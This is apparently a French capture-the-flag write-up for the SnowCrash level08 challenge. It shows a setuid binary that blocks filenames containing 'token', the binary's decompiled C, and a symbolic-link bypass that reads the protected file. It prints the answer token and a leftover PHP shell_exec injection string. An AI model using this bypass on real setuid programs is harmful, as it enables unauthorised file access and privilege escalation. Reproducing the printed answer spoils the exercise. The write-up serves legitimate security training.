
# **Level 08**

Pour le level08, on a un executable et un fichier `token` dans le repertoire courant


```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Lorsque l'on execute `level08` avec le fichier `token` comme argument ca nous qu'on a pas les droits

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Lorsque l'on execute `level08` avec un autre fichier, ca affiche son contenu

```
level08@SnowCrash:~$ ./level08 /var/crash/level06f 
[x {${shell_exec(getflag)}}]
```

On va decompiler l'executable pour mieux l'analyser

```
int32_t main(int32_t argc, char** argv, char** envp)
{
    char** envp_1 = envp;
    void* gsbase;
    int32_t eax_2 = *(gsbase + 0x14);
    if (argc == 1)
    {
        printf("%s [file to read]\n", *argv);
        exit(1);
        /* no return */
    }
    if (strstr(argv[1], "token") != 0)
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
        /* no return */
    }
    int32_t fd = open(argv[1], 0);
    if (fd == 0xffffffff)
    {
        err(1, "Unable to open %s", argv[1]);
        /* no return */
    }
    void buf;
    ssize_t nbytes = read(fd, &buf, 0x400);
    if (nbytes == 0xffffffff)
    {
        err(1, "Unable to read fd %d", fd);
        /* no return */
    }
    ssize_t eax_20 = write(1, &buf, nbytes);
    if (eax_2 == *(gsbase + 0x14))
    {
        return eax_20;
    }
    __stack_chk_fail();
    /* no return */
}
```

En regardant ca on voit que le code nous refuse l'acces uniquement parce que le nom du fichier est `token` donc si on trouve un moyen d'appeler le fichier en modifiant son nom, on devrait pouvoir l'ouvrir

Pour ca on va faire un lien symbolique sur le fichier `token`

```
ln -s /home/user/level08/token symlinklevel08
```

Et executer `level08` en passant notre lien symboliaue en argument

```
level08@SnowCrash:~$ ./level08 /var/crash/symlinklevel08 
quif5eloekouj29ke0vouxean
```



> ### NEXT : [Level 09](/level09/resources/README.md)
